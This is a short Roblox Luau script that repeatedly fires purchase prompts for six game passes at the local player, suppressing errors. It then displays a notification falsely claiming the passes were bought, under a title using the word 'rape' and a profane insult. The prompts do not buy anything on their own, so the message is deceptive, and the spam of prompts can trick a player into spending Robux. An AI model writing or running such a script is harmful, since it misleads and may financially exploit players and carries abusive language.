local ids = {940516031,940582062,1538381343,828787174,1535369160,1537957309}
for i=1,3 do
    for _,id in ids do
        pcall(function()
            game:GetService("MarketplaceService"):PromptPurchase(game.Players.LocalPlayer, id, false, Enum.CurrencyType.Robux)
        end)
    end
    task.wait(0.33)
end
task.spawn(function()
    task.wait(1.8)
    game.StarterGui:SetCore("SendNotification", {Title="ZETA RAPE SUCCESS", Text="6 PASSES BOUGHT – REFRESH INVENTORY FUCKER", Duration=8})
end)
